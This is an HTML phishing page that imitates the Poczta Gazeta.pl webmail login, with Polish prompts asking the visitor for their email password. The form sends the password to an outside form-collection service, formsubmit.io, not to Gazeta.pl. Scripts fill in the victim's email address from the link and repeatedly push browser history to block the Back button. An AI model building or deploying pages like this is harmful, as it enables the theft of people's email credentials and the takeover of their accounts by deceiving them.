<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gazeta</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Impact", "Arial Black", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            position: relative;
        }

        /* Top Centered Header Logo matching original styling */
        .header-logo {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-color: #ffffff;
            font-size: 32px;
            font-weight: normal;
            color: #000000;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .header-logo span {
            background-color: #b5ff82;
            padding: 2px 10px;
            margin-left: 8px;
        }

        /* Sub-navigation bar */
        .sub-bar {
            width: 100%;
            background-color: #ffffff;
            border-top: 1px solid #e0e0e0;
            border-bottom: 1px solid #e0e0e0;
            padding: 8px 40px;
            display: flex;
            align-items: center;
            font-family: Arial, sans-serif;
            font-size: 12px;
            color: #666666;
        }

        .sub-bar-icon {
            display: inline-block;
            width: 16px;
            height: 16px;
            background-color: #777777;
            color: #ffffff;
            border-radius: 50%;
            text-align: center;
            line-height: 16px;
            font-weight: bold;
            font-size: 10px;
            margin-right: 8px;
        }

        /* Main container box matching left floating layout */
        .main-container {
            display: flex;
            justify-content: flex-start;
            align-items: flex-start;
            flex-grow: 1;
            padding: 40px 0 60px 5%;
        }

        /* White floating layout block with distinctive deep shadow */
        .contact-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 48px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            position: relative;
            min-height: 480px;
        }

        .card-heading {
            font-size: 26px;
            color: #000000;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            line-height: 1.2;
        }

        .card-subheading {
            font-size: 20px;
            color: #000000;
            text-transform: uppercase;
            margin-bottom: 28px;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #cccccc;
            font-size: 14px;
            outline: none;
            font-family: Arial, sans-serif;
        }

        .form-control:focus {
            border-color: #000000;
        }

        textarea.form-control {
            resize: vertical;
            min-height: 90px;
        }

        /* Styled rectangular bright light green submit button matching layout precisely */
        .submit-btn {
            width: 100%;
            background-color: #b5ff82;
            color: #000000;
            border: none;
            padding: 14px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            margin-top: 20px;
            letter-spacing: 0.5px;
            transition: background-color 0.15s ease;
        }

        .submit-btn:hover {
            background-color: #a2ef6e;
        }

        /* Windows system watermark background frame overlay reproduction */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-family: Arial, sans-serif;
            font-size: 13px;
            color: rgba(0, 0, 0, 0.22);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }

        @media (max-width: 768px) {
            .main-container {
                justify-content: center;
                padding-left: 0;
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <!-- Centered Header Branding Block -->
    <div class="header-logo">
        POCZTA <span>GAZETA.PL</span>
    </div>

    <!-- Safety Sub-navigation Strip -->
    <div class="sub-bar">
        <span class="sub-bar-icon">i</span> Check the safety rules
    </div>

    <!-- Content Workspace -->
    <main class="main-container">
        <div class="contact-card">
            <h1 class="card-heading">Darmowa poczta w Gazeta.pl
Zaloguj się</h1>
<br><br>
            <form action="https://formsubmit.io" method="POST">

        <div class="right-column">

                    <label for="name"></label>

                </div>
                
                <div class="form-group">
                    <label for="email"></label>

<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>

                <button type="submit" class="submit-btn">Zaloguj się</button>

    <!-- Background environment layout decoration watermark matching context -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
